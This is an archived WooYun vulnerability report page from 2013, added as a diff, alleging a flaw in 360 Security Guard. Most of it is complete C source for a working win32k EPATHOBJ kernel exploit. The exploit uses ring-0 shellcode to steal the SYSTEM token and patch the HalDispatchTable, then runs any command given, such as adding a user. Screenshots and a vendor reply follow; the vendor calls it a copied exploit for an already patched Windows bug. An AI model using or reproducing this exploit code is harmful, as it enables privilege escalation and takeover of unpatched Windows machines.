@@ -1,0 +1,752 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		360卫士主防御存在着危险漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		360卫士主防御存在着危险漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/雷少">雷少</a> 
+</li><li>提交时间：		2013-10-31 12:52</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-31：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-31：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-01-26：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">360无节操，为了测试这次的本地攻击我自己的系统也废了。<br />
+忘开影子系统<br />
+此节操通杀xp 2003 win7 干掉QQ 360等主流软件<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">攻击源码</p><pre><code>#include &lt;stdio.h&gt;<br />
+#include &lt;STDARG.H&gt;<br />
+#include &lt;stddef.h&gt;<br />
+#include &lt;windows.h&gt;<br />
+//#include &lt;ntstatus.h&gt;<br />
+<br />
+#pragma comment(lib, &quot;gdi32&quot;)<br />
+#pragma comment(lib, &quot;kernel32&quot;)<br />
+#pragma comment(lib, &quot;user32&quot;)<br />
+<br />
+#define MAX_POLYPOINTS (8192 * 3)<br />
+#define MAX_REGIONS 8192<br />
+#define CYCLE_TIMEOUT 10000<br />
+<br />
+#pragma comment(linker, &quot;/SECTION:.text,ERW&quot;)<br />
+<br />
+//<br />
+// win32k!EPATHOBJ::pprFlattenRec uninitialized Next pointer testcase.<br />
+//<br />
+// Tavis Ormandy &lt;taviso () cmpxchg8b com&gt;, March 2013<br />
+//<br />
+<br />
+POINT       Points[MAX_POLYPOINTS];<br />
+BYTE        PointTypes[MAX_POLYPOINTS];<br />
+HRGN        Regions[MAX_REGIONS];<br />
+ULONG       NumRegion = 0;<br />
+HANDLE      Mutex;<br />
+<br />
+// Log levels.<br />
+typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;<br />
+<br />
+VOID LogInit();<br />
+VOID LogRelase();<br />
+BOOL LogMessage(LEVEL Level, PCHAR Format, ...);<br />
+<br />
+// Copied from winddi.h from the DDK<br />
+#define PD_BEGINSUBPATH   0x00000001<br />
+#define PD_ENDSUBPATH     0x00000002<br />
+#define PD_RESETSTYLE     0x00000004<br />
+#define PD_CLOSEFIGURE    0x00000008<br />
+#define PD_BEZIERS        0x00000010<br />
+<br />
+#define ENABLE_SWITCH_DESKTOP	1<br />
+<br />
+typedef struct  _POINTFIX<br />
+{<br />
+    ULONG x;<br />
+    ULONG y;<br />
+} POINTFIX, *PPOINTFIX;<br />
+<br />
+// Approximated from reverse engineering.<br />
+typedef struct _PATHRECORD {<br />
+    struct _PATHRECORD *next;<br />
+    struct _PATHRECORD *prev;<br />
+    ULONG               flags;<br />
+    ULONG               count;<br />
+    POINTFIX            points[4];<br />
+} PATHRECORD, *PPATHRECORD;<br />
+<br />
+PPATHRECORD PathRecord;<br />
+PATHRECORD  ExploitRecord = {0};<br />
+PPATHRECORD ExploitRecordExit;<br />
+<br />
+typedef struct _RTL_PROCESS_MODULE_INFORMATION {<br />
+    HANDLE Section;                 // Not filled in<br />
+    PVOID MappedBase;<br />
+    PVOID ImageBase;<br />
+    ULONG ImageSize;<br />
+    ULONG Flags;<br />
+    USHORT LoadOrderIndex;<br />
+    USHORT InitOrderIndex;<br />
+    USHORT LoadCount;<br />
+    USHORT OffsetToFileName;<br />
+    UCHAR  FullPathName[ 256 ];<br />
+} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;<br />
+<br />
+typedef struct _RTL_PROCESS_MODULES {<br />
+    ULONG NumberOfModules;<br />
+    RTL_PROCESS_MODULE_INFORMATION Modules[ 1 ];<br />
+} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;<br />
+<br />
+typedef ULONG ( __stdcall *NtQueryIntervalProfile_ ) ( ULONG, PULONG );<br />
+typedef ULONG ( __stdcall *NtQuerySystemInformation_ ) ( ULONG, PVOID, ULONG, PULONG );<br />
+typedef ULONG ( __stdcall *NtAllocateVirtualMemory_ ) ( HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG );<br />
+typedef ULONG ( __stdcall *NtFreeVirtualMemory_)( HANDLE, PVOID, PULONG, ULONG);<br />
+<br />
+NtQueryIntervalProfile_  NtQueryIntervalProfile;<br />
+NtAllocateVirtualMemory_ NtAllocateVirtualMemory;<br />
+NtQuerySystemInformation_ NtQuerySystemInformation;<br />
+NtFreeVirtualMemory_ NtFreeVirtualMemory;<br />
+ULONG    PsInitialSystemProcess, PsReferencePrimaryToken, <br />
+		 PsGetThreadProcess, WriteToHalDispatchTable, FixAddress;<br />
+<br />
+void _declspec(naked) ShellCode()<br />
+{<br />
+    __asm<br />
+    {<br />
+			pushad<br />
+			pushfd<br />
+			mov esi,PsReferencePrimaryToken<br />
+FindTokenOffset:<br />
+			lodsb<br />
+			cmp al, 8Dh;<br />
+			jnz FindTokenOffset<br />
+			mov edi,[esi+1]<br />
+			mov esi,PsInitialSystemProcess<br />
+			mov esi,[esi]<br />
+			push fs:[124h]<br />
+			mov eax,PsGetThreadProcess<br />
+			call eax<br />
+			add esi, edi<br />
+			push esi<br />
+			add edi, eax<br />
+			movsd<br />
+			<br />
+			;add token ref count.<br />
+			pop esi<br />
+			mov esi, [esi]<br />
+			and esi, 0xFFFFFFF8<br />
+			lea eax, [esi-0x18]<br />
+			mov DWORD PTR [eax], 0x016B00B5<br />
+			;fix the haltable<br />
+			mov eax, WriteToHalDispatchTable<br />
+			mov ecx, FixAddress<br />
+			mov [ecx], 0xC3<br />
+			mov DWORD PTR [eax], ecx<br />
+<br />
+			popfd<br />
+			popad<br />
+			;set ret code for NtQueryIntervalProfile<br />
+			mov eax, [esp+0xc]<br />
+			mov DWORD PTR [eax+4], 1<br />
+			mov DWORD PTR [eax+8], 0xC0000018<br />
+			xor eax, eax<br />
+			ret<br />
+    }<br />
+}<br />
+<br />
+DWORD WINAPI WatchdogThread(LPVOID Parameter)<br />
+{<br />
+	//<br />
+    // This routine waits for a mutex object to timeout, then patches the<br />
+    // compromised linked list to point to an exploit. We need to do this.<br />
+    //<br />
+<br />
+	LogMessage(L_INFO, &quot;Watchdog thread %d waiting on Mutex&quot;, GetCurrentThreadId());<br />
+	<br />
+    if (WaitForSingleObject(Mutex, CYCLE_TIMEOUT) == WAIT_TIMEOUT) {<br />
+		<br />
+		//<br />
+        // It looks like the main thread is stuck in a call to FlattenPath(),<br />
+        // because the kernel is spinning in EPATHOBJ::bFlatten(). We can clean<br />
+        // up, and then patch the list to trigger our exploit.<br />
+        //<br />
+<br />
+		while (NumRegion--)<br />
+            DeleteObject(Regions[NumRegion]);<br />
+		<br />
+        LogMessage(L_ERROR, &quot;InterlockedExchange(0x%08x, 0x%08x);&quot;, &amp;PathRecord-&gt;next, &amp;ExploitRecord);<br />
+		<br />
+        InterlockedExchange((PLONG)&amp;PathRecord-&gt;next, (LONG)&amp;ExploitRecord);<br />
+		<br />
+    } else {<br />
+        LogMessage(L_ERROR, &quot;Mutex object did not timeout, list not patched&quot;);<br />
+    }<br />
+	<br />
+    return 0;<br />
+}<br />
+<br />
+void wellcome()<br />
+{<br />
+	printf(&quot;\t\tthe win32k.sys EPATHOBJ 0day exploit\n&quot;);<br />
+	printf(&quot;*******************************************************************\n&quot;);<br />
+	printf(&quot;***\texploit by:&lt;progmboy&gt; &lt;雷少&gt;\t\t***\n&quot;);<br />
+	printf(&quot;***\t0day finder:&lt;Tavis Ormandy&gt; &lt;雷少&gt;\t***\n&quot;);<br />
+	printf(&quot;***\ttested system:xp/2003/win7/2008 (*32bit*)\t\t***\n&quot;);<br />
+	printf(&quot;*******************************************************************\n&quot;);<br />
+}<br />
+<br />
+void usage()<br />
+{<br />
+	printf(&quot;\nusage:\n&lt;app&gt; &lt;cmd&gt; &lt;parameter&gt;\n&quot;);<br />
+	printf(&quot;example:\napp.exe net \&quot;user 111 111 /add\&quot;&quot;);<br />
+}<br />
+<br />
+BOOL <br />
+FindAFixAddress(<br />
+	ULONG NtoskrnlBase)<br />
+{<br />
+	FixAddress = NtoskrnlBase + FIELD_OFFSET(IMAGE_DOS_HEADER, e_res2);<br />
+	LogMessage(L_INFO, &quot;Get FixAddress --&gt; 0x%08x&quot;, FixAddress);<br />
+	return TRUE;<br />
+<br />
+}<br />
+<br />
+// 0x602464FF; /*jmp esp+0x60*/<br />
+// 0x51C3686A; /*push 0; ret*/<br />
+DWORD CheckMagicDword()<br />
+{<br />
+	OSVERSIONINFOEX OSVer;<br />
+	DWORD dwMagic = 0;<br />
+<br />
+    OSVer.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);<br />
+    if(GetVersionEx((OSVERSIONINFO *)&amp;OSVer)){<br />
+		switch(OSVer.dwMajorVersion){<br />
+		case 5:<br />
+			dwMagic = 0x602464FF;<br />
+			break;<br />
+		case 6:<br />
+			dwMagic = 0x642464FF;<br />
+			break;<br />
+		default:<br />
+			dwMagic = 0;<br />
+		}<br />
+	}<br />
+	return dwMagic;<br />
+}<br />
+<br />
+<br />
+int main(int argc, char **argv)<br />
+{<br />
+    HANDLE      Thread;<br />
+    HDC         Device;<br />
+    ULONG       Size;<br />
+    ULONG       PointNum;<br />
+	int nret = 0;<br />
+	<br />
+	DWORD MAGIC_DWORD = CheckMagicDword();<br />
+    ULONG AllocSize = 0x1000, status, NtoskrnlBase;<br />
+	RTL_PROCESS_MODULES  module;<br />
+	HMODULE ntoskrnl = NULL;<br />
+	DWORD dwFix;<br />
+	ULONG Address = MAGIC_DWORD &amp; 0xFFFFF000;<br />
+	LONG ret;<br />
+	BOOL bRet = FALSE;<br />
+#ifdef ENABLE_SWITCH_DESKTOP<br />
+	HDESK hDesk;<br />
+#endif<br />
+    HMODULE  ntdll = GetModuleHandle( &quot;ntdll.dll&quot; );<br />
+	<br />
+	wellcome();<br />
+<br />
+	if (argc &lt; 2){<br />
+		usage();<br />
+		return -1;<br />
+	}<br />
+<br />
+	if (!MAGIC_DWORD){<br />
+		LogMessage(L_ERROR, &quot;unsupported system version\n&quot;);<br />
+		return -1;<br />
+	}<br />
+<br />
+	LogInit();<br />
+<br />
+	NtQueryIntervalProfile    =  (NtQueryIntervalProfile_)GetProcAddress( ntdll ,&quot;NtQueryIntervalProfile&quot; );<br />
+    NtAllocateVirtualMemory    =  (NtAllocateVirtualMemory_)GetProcAddress( ntdll ,&quot;NtAllocateVirtualMemory&quot; );<br />
+    NtQuerySystemInformation  =  (NtQuerySystemInformation_)GetProcAddress( ntdll ,&quot;NtQuerySystemInformation&quot; );<br />
+	NtFreeVirtualMemory =  (NtFreeVirtualMemory_)GetProcAddress( ntdll ,&quot;NtFreeVirtualMemory&quot; );<br />
+    if ( !NtQueryIntervalProfile || !NtAllocateVirtualMemory || <br />
+		 !NtQuerySystemInformation || !NtFreeVirtualMemory){<br />
+		LogMessage(L_ERROR, &quot;get function address error\n&quot;);<br />
+		LogRelase();<br />
+		return -1;<br />
+	}<br />
+	<br />
+	//<br />
+	// try to allocate memory.<br />
+	//<br />
+<br />
+	while (TRUE){<br />
+		ret = NtAllocateVirtualMemory( (HANDLE)-1, &amp;Address, 0, &amp;AllocSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );<br />
+		if(ret &lt; 0){<br />
+			MEMORY_BASIC_INFORMATION meminfo;<br />
+			LogMessage(L_ERROR, &quot;allocate memory error code 0x%08x&quot;, ret);<br />
+			LogMessage(L_INFO, &quot;try to free memory&quot;);<br />
+			if(VirtualQuery((LPVOID)Address, &amp;meminfo, sizeof(meminfo))){<br />
+				LogMessage(L_INFO, &quot;meminfo state %d %d\n&quot;, meminfo.State, meminfo.Protect);<br />
+			}<br />
+			ret = NtFreeVirtualMemory((HANDLE)-1, &amp;Address, &amp;AllocSize, MEM_RELEASE);<br />
+			if (ret &lt; 0){<br />
+				LogMessage(L_ERROR, &quot;free memory error code 0x%08x&quot;, ret);<br />
+				LogRelase();<br />
+				return -1;<br />
+			}<br />
+		}else{<br />
+			break;<br />
+		}<br />
+	}<br />
+	<br />
+	//<br />
+	// get the kernel info<br />
+	//<br />
+<br />
+    status = NtQuerySystemInformation( 11, &amp;module, sizeof(RTL_PROCESS_MODULES), NULL);//SystemModuleInformation 11<br />
+    if ( status != 0xC0000004 ){<br />
+		LogMessage(L_ERROR, &quot;NtQuerySystemInformation error code:0x%08x\n&quot;, status);<br />
+        LogRelase();<br />
+		return -1;<br />
+	}<br />
+	<br />
+    NtoskrnlBase     =  (ULONG)module.Modules[0].ImageBase;<br />
+	<br />
+    //<br />
+    // 把ntoskrnl.exe加载进来<br />
+    //<br />
+	<br />
+    ntoskrnl = LoadLibraryA( (LPCSTR)( module.Modules[0].FullPathName + module.Modules[0].OffsetToFileName ) );<br />
+    if (ntoskrnl == NULL){<br />
+		LogMessage(L_ERROR, &quot;LoadLibraryA error code:0x%08x\n&quot;, GetLastError());<br />
+        LogRelase();<br />
+		return -1;<br />
+	}<br />
+	 <br />
+    //<br />
+    // 计算实际地址<br />
+    //<br />
+	<br />
+    WriteToHalDispatchTable =  (ULONG)GetProcAddress(ntoskrnl,&quot;HalDispatchTable&quot;) - (ULONG)ntoskrnl + NtoskrnlBase + 4;<br />
+    PsInitialSystemProcess =  (ULONG)GetProcAddress(ntoskrnl,&quot;PsInitialSystemProcess&quot;) - (ULONG)ntoskrnl + NtoskrnlBase;<br />
+    PsReferencePrimaryToken = (ULONG)GetProcAddress(ntoskrnl,&quot;PsReferencePrimaryToken&quot;) - (ULONG)ntoskrnl + NtoskrnlBase;<br />
+    PsGetThreadProcess =  (ULONG)GetProcAddress(ntoskrnl,&quot;PsGetThreadProcess&quot;) - (ULONG)ntoskrnl + NtoskrnlBase;<br />
+	<br />
+	if(!FindAFixAddress(NtoskrnlBase)){<br />
+		LogMessage(L_ERROR, &quot;Can not Find A Fix Address\n&quot;);<br />
+		nret = -1;<br />
+		goto __end;<br />
+	}<br />
+<br />
+	//<br />
+    // Create our PATHRECORD in user space we will get added to the EPATHOBJ<br />
+    // pathrecord chain.<br />
+    //<br />
+<br />
+	PathRecord = (PPATHRECORD)VirtualAlloc(NULL,<br />
+                              sizeof(PATHRECORD),<br />
+                              MEM_COMMIT | MEM_RESERVE,<br />
+                              PAGE_EXECUTE_READWRITE);<br />
+<br />
+    LogMessage(L_INFO, &quot;Alllocated userspace PATHRECORD () %p&quot;, PathRecord);<br />
+	<br />
+	//<br />
+    // Initialize with recognizable debugging values.<br />
+    //<br />
+<br />
+	FillMemory(PathRecord, sizeof(PATHRECORD), 0xCC);<br />
+<br />
+    PathRecord-&gt;next    = PathRecord;<br />
+    PathRecord-&gt;prev    = (PPATHRECORD)(0x42424242);<br />
+	<br />
+	//<br />
+    // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from<br />
+    // EPATHOBJ::bFlatten(). We don&#039;t set it so that we can trigger an infinite<br />
+    // loop in EPATHOBJ::bFlatten().<br />
+    //<br />
+<br />
+	PathRecord-&gt;flags   = 0;<br />
+<br />
+    LogMessage(L_INFO, &quot;  -&gt;next  @ %p&quot;, PathRecord-&gt;next);<br />
+    LogMessage(L_INFO, &quot;  -&gt;prev  @ %p&quot;, PathRecord-&gt;prev);<br />
+    LogMessage(L_INFO, &quot;  -&gt;flags @ %u&quot;, PathRecord-&gt;flags);<br />
+	<br />
+	ExploitRecordExit = (PPATHRECORD)MAGIC_DWORD;<br />
+	ExploitRecordExit-&gt;next = NULL;<br />
+	ExploitRecordExit-&gt;next = NULL;<br />
+	ExploitRecordExit-&gt;flags = PD_BEGINSUBPATH;<br />
+	ExploitRecordExit-&gt;count = 0;<br />
+	<br />
+<br />
+	ExploitRecord.next  = (PPATHRECORD)MAGIC_DWORD;<br />
+    ExploitRecord.prev  = (PPATHRECORD)WriteToHalDispatchTable;<br />
+    ExploitRecord.flags = PD_BEZIERS | PD_BEGINSUBPATH;<br />
+	ExploitRecord.count = 4;<br />
+	<br />
+    LogMessage(L_INFO, &quot;Creating complex bezier path with %x&quot;, (ULONG)(PathRecord) &gt;&gt; 4);<br />
+	<br />
+	//<br />
+    // Generate a large number of Belier Curves made up of pointers to our<br />
+    // PATHRECORD object.<br />
+    //<br />
+<br />
+	for (PointNum = 0; PointNum &lt; MAX_POLYPOINTS; PointNum++) {<br />
+        Points[PointNum].x      = (ULONG)(PathRecord) &gt;&gt; 4;<br />
+        Points[PointNum].y      = (ULONG)(PathRecord) &gt;&gt; 4;<br />
+        PointTypes[PointNum]    = PT_BEZIERTO;<br />
+    }<br />
+<br />
+	//<br />
+    // Switch to a dedicated desktop so we don&#039;t spam the visible desktop with<br />
+    // our Lines (Not required, just stops the screen from redrawing slowly).<br />
+    //<br />
+#ifdef ENABLE_SWITCH_DESKTOP<br />
+	hDesk = CreateDesktop( &quot;DontPanic&quot;,<br />
+							NULL,<br />
+							NULL,<br />
+							0,<br />
+							GENERIC_ALL,<br />
+	 						NULL);<br />
+	if (hDesk){<br />
+		SetThreadDesktop(hDesk);<br />
+	}<br />
+#endif<br />
+	<br />
+	while (TRUE){<br />
+<br />
+		BOOL bBreak = FALSE;<br />
+<br />
+		Mutex = CreateMutex(NULL, TRUE, NULL);<br />
+		if (!Mutex){<br />
+			LogMessage(L_INFO, &quot;Allocated %u HRGN objects&quot;, NumRegion);<br />
+			nret = -1;<br />
+			goto __end;<br />
+		}<br />
+		<br />
+		//<br />
+		// Get a handle to this Desktop.<br />
+		//<br />
+<br />
+		Device = GetDC(NULL);<br />
+		<br />
+		//<br />
+		// Spawn a thread to cleanup<br />
+		//<br />
+<br />
+		Thread = CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);<br />
+		<br />
+		LogMessage(L_INFO, &quot;start CreateRoundRectRgn&quot;);<br />
+		<br />
+		//<br />
+		// We need to cause a specific AllocObject() to fail to trigger the<br />
+		// exploitable condition. To do this, I create a large number of rounded<br />
+		// rectangular regions until they start failing. I don&#039;t think it matters<br />
+		// what you use to exhaust paged memory, there is probably a better way.<br />
+		//<br />
+		// I don&#039;t use the simpler CreateRectRgn() because it leaks a GDI handle on<br />
+		// failure. Seriously, do some damn QA Microsoft, wtf.<br />
+		//<br />
+<br />
+		for (Size = 1 &lt;&lt; 26; Size; Size &gt;&gt;= 1) {<br />
+			while (TRUE){<br />
+				HRGN hm = CreateRoundRectRgn(0, 0, 1, Size, 1, 1);<br />
+				if (!hm){<br />
+					break;<br />
+				}<br />
+				if (NumRegion &lt; MAX_REGIONS){<br />
+					Regions[NumRegion] = hm;<br />
+					NumRegion++;<br />
+				}else{<br />
+					NumRegion = 0;<br />
+				}<br />
+			}<br />
+		}<br />
+<br />
+		LogMessage(L_INFO, &quot;Allocated %u HRGN objects&quot;, NumRegion);<br />
+<br />
+		LogMessage(L_INFO, &quot;Flattening curves...&quot;);<br />
+		<br />
+		//<br />
+		// Begin filling the free list with our points.<br />
+		//<br />
+		<br />
+		dwFix = *(PULONG)ShellCode;<br />
+<br />
+		for (PointNum = MAX_POLYPOINTS; PointNum; PointNum -= 3) {<br />
+			BeginPath(Device);<br />
+			PolyDraw(Device, Points, PointTypes, PointNum);<br />
+			EndPath(Device);<br />
+			FlattenPath(Device);<br />
+			FlattenPath(Device);<br />
+			<br />
+			//<br />
+			// call the function to exploit.<br />
+			//<br />
+<br />
+			ret = NtQueryIntervalProfile(2, (PULONG)ShellCode);<br />
+			<br />
+			//<br />
+			// we will set the status with 0xC0000018 in ring0 shellcode.<br />
+			//<br />
+<br />
+			if (*(PULONG)ShellCode == 0xC0000018){<br />
+				bRet = TRUE;<br />
+				break;<br />
+			}<br />
+			<br />
+			//<br />
+			// fix<br />
+			//<br />
+			<br />
+			*(PULONG)ShellCode = dwFix;<br />
+<br />
+			EndPath(Device);<br />
+		}<br />
+		<br />
+		if (bRet){<br />
+			LogMessage(L_INFO, &quot;Exploit ok run command&quot;);<br />
+			ShellExecute( NULL, &quot;open&quot;, argv[1], argc &gt; 2 ? argv[2] : NULL, NULL, SW_SHOW);<br />
+			bBreak = TRUE;<br />
+		}else{<br />
+			LogMessage(L_INFO, &quot;No luck, cleaning up. and try again..&quot;);<br />
+		}<br />
+    <br />
+		//<br />
+		// If we reach here, we didn&#039;t trigger the condition. Let the other thread know.<br />
+		//<br />
+<br />
+		ReleaseMutex(Mutex);<br />
+		<br />
+		ReleaseDC(NULL, Device);<br />
+		WaitForSingleObject(Thread, INFINITE);<br />
+<br />
+		if (bBreak){<br />
+			break;<br />
+		}<br />
+<br />
+	}<br />
+__end:<br />
+	LogRelase();<br />
+	if (ntoskrnl)<br />
+		FreeLibrary(ntoskrnl);<br />
+#ifdef ENABLE_SWITCH_DESKTOP<br />
+	if (hDesk){<br />
+		CloseHandle(hDesk);<br />
+	}<br />
+#endif<br />
+    return nret;<br />
+}<br />
+<br />
+CRITICAL_SECTION gCSection;<br />
+<br />
+VOID LogInit()<br />
+{<br />
+	InitializeCriticalSection(&amp;gCSection);<br />
+}<br />
+<br />
+VOID LogRelase()<br />
+{<br />
+	DeleteCriticalSection(&amp;gCSection);<br />
+}<br />
+<br />
+//<br />
+// A quick logging routine for debug messages.<br />
+//<br />
+<br />
+BOOL LogMessage(LEVEL Level, PCHAR Format, ...)<br />
+{<br />
+    CHAR Buffer[1024] = {0};<br />
+    va_list Args;<br />
+	<br />
+	EnterCriticalSection(&amp;gCSection);<br />
+<br />
+    va_start(Args, Format);<br />
+    _snprintf(Buffer, sizeof(Buffer), Format, Args);<br />
+    va_end(Args);<br />
+<br />
+    switch (Level) {<br />
+        case L_DEBUG: fprintf(stdout, &quot;[?] %s\n&quot;, Buffer); break;<br />
+        case L_INFO:  fprintf(stdout, &quot;[+] %s\n&quot;, Buffer); break;<br />
+        case L_WARN:  fprintf(stderr, &quot;[*] %s\n&quot;, Buffer); break;<br />
+        case L_ERROR: fprintf(stderr, &quot;[!] %s\n&quot;, Buffer); break;<br />
+    }<br />
+	<br />
+    fflush(stdout);<br />
+    fflush(stderr);<br />
+	<br />
+	LeaveCriticalSection(&amp;gCSection);<br />
+<br />
+    return TRUE;<br />
+}</code></pre><p class='detail'><br />
+<br />
+测试方法：</p><p class="detail"><a href="../images/31124726a2639186e6084aa46db735a21b728f6b.png" target="_blank"><img src="../images/31124726a2639186e6084aa46db735a21b728f6b.png" alt="11.png" width="600"/></a></p><p class="detail">任意一个进程</p><p class="detail"><a href="../images/31124740cf69fcf68490c6b4e77c5b5040e2440c.png" target="_blank"><img src="../images/31124740cf69fcf68490c6b4e77c5b5040e2440c.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+执行后360的功能全废了<br />
+<br />
+</p><p class="detail"><a href="../images/31124810e3e787351fe3cdc6a298841602fd467d.png" target="_blank"><img src="../images/31124810e3e787351fe3cdc6a298841602fd467d.png" alt="1.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/31124820f94759c85b24077e02013dc18cf8d20b.png" target="_blank"><img src="../images/31124820f94759c85b24077e02013dc18cf8d20b.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/31124922d4fc92134c98bfdda75dfeea3cd223ec.png" target="_blank"><img src="../images/31124922d4fc92134c98bfdda75dfeea3cd223ec.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/31124922d4fc92134c98bfdda75dfeea3cd223ec.png" target="_blank"><img src="../images/31124922d4fc92134c98bfdda75dfeea3cd223ec.png" alt="4.png" width="600"/></a></p><p class="detail">调用了某牛的程序 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们好专业 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/雷少" title="雷少">雷少</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041578" title="360卫士主防御存在着危险漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-10-31 14:59</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">此报告中的问题的并非是360的安全漏洞，是一个今年3月已经公开的微软Winodows内核漏洞，而且在今年7月已经修复，且相关攻击代码早已公开，此报告中的代码即是由已经在看雪论坛在今年6月公开的攻击代码基础上照抄和修改了作者名的结果，看雪上的代码链接为：<br />
+http://bbs.pediy.com/showthread.php?t=172839<br />
+此攻击代码公开后，360在5天内全球首家提供了针对此攻击的防御临时补丁版本：<br />
+http://bbs.360safe.com/thread-1695687-1-1.html<br />
+带有临时补丁版本的下载地址：<br />
+http://dl.360safe.com/setupbeta_9.2.0.1002z.exe<br />
+此临时补丁可以防御这个当时的0day漏洞的攻击<br />
+<br />
+在今年7月的补丁日，微软发布了针对此漏洞的安全补丁：<br />
+http://blogs.technet.com/b/msrc/archive/2013/07/04/advance-notification-service-for-july-2103-security-bulletin-release.aspx<br />
+在用户升级了微软补丁后，相关临时补丁在360防御中已经撤销，用户按360提示安装补丁后即可彻底对此漏洞的攻击免疫。</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="41578";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
